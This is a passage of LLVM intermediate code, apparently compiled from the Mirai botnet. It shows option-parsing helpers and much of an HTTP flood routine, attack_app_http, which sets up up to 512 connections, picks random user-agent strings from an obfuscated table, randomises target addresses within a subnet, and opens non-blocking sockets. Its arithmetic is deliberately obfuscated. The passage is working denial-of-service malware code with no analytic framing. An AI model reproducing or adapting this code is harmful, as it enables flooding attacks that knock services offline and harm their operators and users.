; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 20, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 23, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %2776

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %2776

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %2776

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %2776

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

; <label>:106:                                    ; preds = %139, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %145

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %138

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %138

; <label>:127:                                    ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = sub i32 0, 32
  %135 = add i32 %133, %134
  %136 = sub nsw i32 %133, 32
  %137 = trunc i32 %135 to i8
  store i8 %137, i8* %131, align 1
  br label %138

; <label>:138:                                    ; preds = %127, %119, %111
  br label %139

; <label>:139:                                    ; preds = %138
  %140 = load i32, i32* %10, align 4
  %141 = sub i32 %140, -990892058
  %142 = add i32 %141, 1
  %143 = add i32 %142, -990892058
  %144 = add nsw i32 %140, 1
  store i32 %143, i32* %10, align 4
  br label %106

; <label>:145:                                    ; preds = %106
  %146 = load i32, i32* %18, align 4
  %147 = icmp sgt i32 %146, 512
  br i1 %147, label %148, label %149

; <label>:148:                                    ; preds = %145
  store i32 512, i32* %18, align 4
  br label %149

; <label>:149:                                    ; preds = %148, %145
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  call void @table_unlock_val(i8 zeroext 47)
  call void @table_unlock_val(i8 zeroext 48)
  call void @table_unlock_val(i8 zeroext 49)
  call void @table_unlock_val(i8 zeroext 50)
  call void @table_unlock_val(i8 zeroext 51)
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  %150 = load i32, i32* %18, align 4
  %151 = sext i32 %150 to i64
  %152 = call noalias i8* @calloc(i64 %151, i64 3140) #6
  %153 = bitcast i8* %152 to %struct.attack_http_state*
  store %struct.attack_http_state* %153, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %154

; <label>:154:                                    ; preds = %355, %149
  %155 = load i32, i32* %9, align 4
  %156 = load i32, i32* %18, align 4
  %157 = icmp slt i32 %155, %156
  br i1 %157, label %158, label %362

; <label>:158:                                    ; preds = %154
  %159 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %162, i32 0, i32 1
  store i8 0, i8* %163, align 4
  %164 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %167, i32 0, i32 0
  store i32 -1, i32* %168, align 4
  %169 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %170 = load i32, i32* %9, align 4
  %171 = load i8, i8* %5, align 1
  %172 = zext i8 %171 to i32
  %173 = srem i32 %170, %172
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  %177 = load i32, i32* %176, align 4
  %178 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %181, i32 0, i32 4
  store i32 %177, i32* %182, align 4
  %183 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i32 0, i32 6
  %188 = getelementptr inbounds [257 x i8], [257 x i8]* %187, i32 0, i32 0
  %189 = load i8*, i8** %17, align 8
  %190 = call i32 @util_strcpy(i8* %188, i8* %189)
  %191 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %194, i32 0, i32 6
  %196 = getelementptr inbounds [257 x i8], [257 x i8]* %195, i64 0, i64 0
  %197 = load i8, i8* %196, align 4
  %198 = sext i8 %197 to i32
  %199 = icmp ne i32 %198, 47
  br i1 %199, label %200, label %228

; <label>:200:                                    ; preds = %158
  %201 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %202 = load i32, i32* %9, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %204, i32 0, i32 6
  %206 = getelementptr inbounds [257 x i8], [257 x i8]* %205, i32 0, i32 0
  %207 = getelementptr inbounds i8, i8* %206, i64 1
  %208 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %211, i32 0, i32 6
  %213 = getelementptr inbounds [257 x i8], [257 x i8]* %212, i32 0, i32 0
  %214 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i32 0, i32 6
  %219 = getelementptr inbounds [257 x i8], [257 x i8]* %218, i32 0, i32 0
  %220 = call i32 @util_strlen(i8* %219)
  %221 = sext i32 %220 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %207, i8* %213, i64 %221, i32 1, i1 false)
  %222 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %225, i32 0, i32 6
  %227 = getelementptr inbounds [257 x i8], [257 x i8]* %226, i64 0, i64 0
  store i8 47, i8* %227, align 4
  br label %228

; <label>:228:                                    ; preds = %200, %158
  %229 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %230 = load i32, i32* %9, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %232, i32 0, i32 10
  %234 = getelementptr inbounds [9 x i8], [9 x i8]* %233, i32 0, i32 0
  %235 = load i8*, i8** %15, align 8
  %236 = call i32 @util_strcpy(i8* %234, i8* %235)
  %237 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %238 = load i32, i32* %9, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %237, i64 %239
  %241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %240, i32 0, i32 9
  %242 = getelementptr inbounds [9 x i8], [9 x i8]* %241, i32 0, i32 0
  %243 = load i8*, i8** %15, align 8
  %244 = call i32 @util_strcpy(i8* %242, i8* %243)
  %245 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %246 = load i32, i32* %9, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %245, i64 %247
  %249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %248, i32 0, i32 7
  %250 = getelementptr inbounds [129 x i8], [129 x i8]* %249, i32 0, i32 0
  %251 = load i8*, i8** %16, align 8
  %252 = call i32 @util_strcpy(i8* %250, i8* %251)
  %253 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %254 = load i32, i32* %9, align 4
  %255 = load i8, i8* %5, align 1
  %256 = zext i8 %255 to i32
  %257 = srem i32 %254, %256
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %253, i64 %258
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i32 0, i32 2
  %261 = load i8, i8* %260, align 4
  %262 = zext i8 %261 to i32
  %263 = icmp slt i32 %262, 32
  br i1 %263, label %264, label %298

; <label>:264:                                    ; preds = %228
  %265 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %266 = load i32, i32* %9, align 4
  %267 = load i8, i8* %5, align 1
  %268 = zext i8 %267 to i32
  %269 = srem i32 %266, %268
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i64 %270
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i32 0, i32 1
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @ntohl(i32 %273) #7
  %275 = call i32 @rand_next()
  %276 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %277 = load i32, i32* %9, align 4
  %278 = load i8, i8* %5, align 1
  %279 = zext i8 %278 to i32
  %280 = srem i32 %277, %279
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i64 %281
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %282, i32 0, i32 2
  %284 = load i8, i8* %283, align 4
  %285 = zext i8 %284 to i32
  %286 = lshr i32 %275, %285
  %287 = sub i32 0, %274
  %288 = sub i32 0, %286
  %289 = add i32 %287, %288
  %290 = sub i32 0, %289
  %291 = add i32 %274, %286
  %292 = call i32 @htonl(i32 %290) #7
  %293 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i32 0, i32 4
  store i32 %292, i32* %297, align 4
  br label %298

; <label>:298:                                    ; preds = %264, %228
  %299 = call i32 @rand_next()
  %300 = urem i32 %299, 5
  switch i32 %300, label %346 [
    i32 0, label %301
    i32 1, label %310
    i32 2, label %319
    i32 3, label %328
    i32 4, label %337
  ]

; <label>:301:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 54)
  %302 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %305, i32 0, i32 5
  %307 = getelementptr inbounds [512 x i8], [512 x i8]* %306, i32 0, i32 0
  %308 = call i8* @table_retrieve_val(i32 54, i32* null)
  %309 = call i32 @util_strcpy(i8* %307, i8* %308)
  call void @table_lock_val(i8 zeroext 54)
  br label %346

; <label>:310:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 55)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i32 0, i32 0
  %317 = call i8* @table_retrieve_val(i32 55, i32* null)
  %318 = call i32 @util_strcpy(i8* %316, i8* %317)
  call void @table_lock_val(i8 zeroext 55)
  br label %346

; <label>:319:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 56)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i32 0, i32 0
  %326 = call i8* @table_retrieve_val(i32 56, i32* null)
  %327 = call i32 @util_strcpy(i8* %325, i8* %326)
  call void @table_lock_val(i8 zeroext 56)
  br label %346

; <label>:328:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 57)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i32 0, i32 0
  %335 = call i8* @table_retrieve_val(i32 57, i32* null)
  %336 = call i32 @util_strcpy(i8* %334, i8* %335)
  call void @table_lock_val(i8 zeroext 57)
  br label %346

; <label>:337:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 58)
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 5
  %343 = getelementptr inbounds [512 x i8], [512 x i8]* %342, i32 0, i32 0
  %344 = call i8* @table_retrieve_val(i32 58, i32* null)
  %345 = call i32 @util_strcpy(i8* %343, i8* %344)
  call void @table_lock_val(i8 zeroext 58)
  br label %346

; <label>:346:                                    ; preds = %337, %328, %319, %310, %301, %298
  %347 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %350, i32 0, i32 6
  %352 = getelementptr inbounds [257 x i8], [257 x i8]* %351, i32 0, i32 0
  %353 = load i8*, i8** %17, align 8
  %354 = call i32 @util_strcpy(i8* %352, i8* %353)
  br label %355

; <label>:355:                                    ; preds = %346
  %356 = load i32, i32* %9, align 4
  %357 = sub i32 0, %356
  %358 = sub i32 0, 1
  %359 = add i32 %357, %358
  %360 = sub i32 0, %359
  %361 = add nsw i32 %356, 1
  store i32 %360, i32* %9, align 4
  br label %154

; <label>:362:                                    ; preds = %154
  br label %363

; <label>:363:                                    ; preds = %2775, %1045, %1035, %362
  store i32 0, i32* %23, align 4
  %364 = call i64 @time(i64* null) #6
  %365 = trunc i64 %364 to i32
  store i32 %365, i32* %27, align 4
  br label %366

; <label>:366:                                    ; preds = %363
  %367 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %368 = getelementptr inbounds [16 x i64], [16 x i64]* %367, i64 0, i64 0
  %369 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %368) #6, !srcloc !1
  %370 = extractvalue { i64, i64* } %369, 0
  %371 = extractvalue { i64, i64* } %369, 1
  %372 = trunc i64 %370 to i32
  store i32 %372, i32* %28, align 4
  %373 = ptrtoint i64* %371 to i64
  %374 = trunc i64 %373 to i32
  store i32 %374, i32* %29, align 4
  br label %375

; <label>:375:                                    ; preds = %366
  br label %376

; <label>:376:                                    ; preds = %375
  %377 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %378 = getelementptr inbounds [16 x i64], [16 x i64]* %377, i64 0, i64 0
  %379 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %378) #6, !srcloc !2
  %380 = extractvalue { i64, i64* } %379, 0
  %381 = extractvalue { i64, i64* } %379, 1
  %382 = trunc i64 %380 to i32
  store i32 %382, i32* %30, align 4
  %383 = ptrtoint i64* %381 to i64
  %384 = trunc i64 %383 to i32
  store i32 %384, i32* %31, align 4
  br label %385

; <label>:385:                                    ; preds = %376
  store i32 0, i32* %9, align 4
  br label %386

; <label>:386:                                    ; preds = %1025, %385
  %387 = load i32, i32* %9, align 4
  %388 = load i32, i32* %18, align 4
  %389 = icmp slt i32 %387, %388
  br i1 %389, label %390, label %1032

; <label>:390:                                    ; preds = %386
  %391 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %392 = load i32, i32* %9, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %391, i64 %393
  store %struct.attack_http_state* %394, %struct.attack_http_state** %26, align 8
  %395 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %395, i32 0, i32 1
  %397 = load i8, i8* %396, align 4
  %398 = zext i8 %397 to i32
  %399 = icmp eq i32 %398, 1
  br i1 %399, label %400, label %412

; <label>:400:                                    ; preds = %390
  %401 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %402 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %401, i32 0, i32 12
  %403 = load i32, i32* %402, align 4
  %404 = icmp ne i32 %403, 0
  br i1 %404, label %405, label %408

; <label>:405:                                    ; preds = %400
  %406 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %407 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %406, i32 0, i32 1
  store i8 4, i8* %407, align 4
  br label %411

; <label>:408:                                    ; preds = %400
  %409 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %410 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %409, i32 0, i32 1
  store i8 0, i8* %410, align 4
  br label %411

; <label>:411:                                    ; preds = %408, %405
  br label %412

; <label>:412:                                    ; preds = %411, %390
  %413 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %413, i32 0, i32 1
  %415 = load i8, i8* %414, align 4
  %416 = zext i8 %415 to i32
  %417 = icmp eq i32 %416, 0
  br i1 %417, label %418, label %506

; <label>:418:                                    ; preds = %412
  %419 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %419, i8 0, i64 16, i32 4, i1 false)
  %420 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %421 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 4
  %423 = icmp ne i32 %422, -1
  br i1 %423, label %424, label %429

; <label>:424:                                    ; preds = %418
  %425 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %426 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %425, i32 0, i32 0
  %427 = load i32, i32* %426, align 4
  %428 = call i32 @close(i32 %427)
  br label %429

; <label>:429:                                    ; preds = %424, %418
  %430 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %431 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %431, i32 0, i32 0
  store i32 %430, i32* %432, align 4
  %433 = icmp eq i32 %430, -1
  br i1 %433, label %434, label %435

; <label>:434:                                    ; preds = %429
  br label %1025

; <label>:435:                                    ; preds = %429
  %436 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %437 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %436, i32 0, i32 0
  %438 = load i32, i32* %437, align 4
  %439 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %440 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %439, i32 0, i32 0
  %441 = load i32, i32* %440, align 4
  %442 = call i32 (i32, i32, ...) @fcntl(i32 %441, i32 3, i32 0)
  %443 = and i32 2048, %442
  %444 = xor i32 2048, %442
  %445 = or i32 %443, %444
  %446 = or i32 2048, %442
  %447 = call i32 (i32, i32, ...) @fcntl(i32 %438, i32 4, i32 %445)
  store i32 65535, i32* %10, align 4
  %448 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %449 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 4
  %451 = bitcast i32* %10 to i8*
  %452 = call i32 @setsockopt(i32 %450, i32 0, i32 8, i8* %451, i32 4) #6
  %453 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %453, align 4
  %454 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %455 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %454, i32 0, i32 4
  %456 = load i32, i32* %455, align 4
  %457 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %458 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %457, i32 0, i32 0
  store i32 %456, i32* %458, align 4
  %459 = load i16, i16* %19, align 2
  %460 = call zeroext i16 @htons(i16 zeroext %459) #7
